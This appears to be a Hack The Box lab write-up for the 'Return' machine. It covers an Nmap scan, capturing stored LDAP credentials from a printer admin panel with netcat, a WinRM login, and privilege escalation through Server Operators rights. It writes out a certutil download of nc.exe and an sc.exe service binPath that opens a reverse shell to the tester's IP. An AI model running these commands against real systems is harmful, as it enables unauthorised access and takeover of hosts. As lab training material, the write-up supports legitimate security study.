# HTB-return

As always, started with Nmap, and did some recon of the website.

```bash
# Nmap 7.94SVN scan initiated Sat Feb 17 18:19:21 2024 as: nmap -p- -Pn -A -T4 -sC -oN nmap.txt 10.129.95.241
Nmap scan report for 10.129.95.241
Host is up (0.049s latency).
Not shown: 65510 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-02-17 23:38:52Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m37s
| smb2-time: 
|   date: 2024-02-17T23:39:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Feb 17 18:21:14 2024 -- 1 IP address (1 host up) scanned in 112.48 seconds
```

Nmap didn't reveal anything useful, but right away on the website, I spotted something that would probably lead me to my foothold. Under the 'settings' tab, I saw saved credentials, and I saw I could modify the server address.

<figure><img src=".gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

I immediately fired up netcat, changed the server address to my IP, and I scored credentials right away.

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Too easy, the next step was to login with them using Evil Win-RM. Took me a few tries because I didn't need to add the domain name to the user.

<figure><img src=".gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

The I got my user.txt on the desktop

<figure><img src=".gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

Next up is priv esc. I ended up transferring over WinPEAs, but it killed my session so I didn't get to finish. From what I did review, I didn't find anything of interest.

Next step was to see what user permissions I have by running

```bash
net user svc-printer
```

And I am a part of the 'Server Operators' Group

<figure><img src=".gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

I know that group can start/stop system services, so I went ahead and uploaded netcat on the machine.

```
certutil.exe -urlcache -split -f http://10.10.14.178/nc.exe nc.exe
```

And then I needed to modify a service to get our reverse shell.

{% code overflow="wrap" %}
```
sc.exe config vss binPath="C:\Users\svc-printer\Documents\nc.exe -e cmd.exe 10.10.14.178 1234"
```
{% endcode %}

<figure><img src=".gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

Next was to stop, and then restart the service, while having netcat listening on my machine.

<figure><img src=".gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Stop

```
sc.exe stop vss
```

Then Start

```
sc.exe start vss
```

<figure><img src=".gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

We get our shell and root flag

<figure><img src=".gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
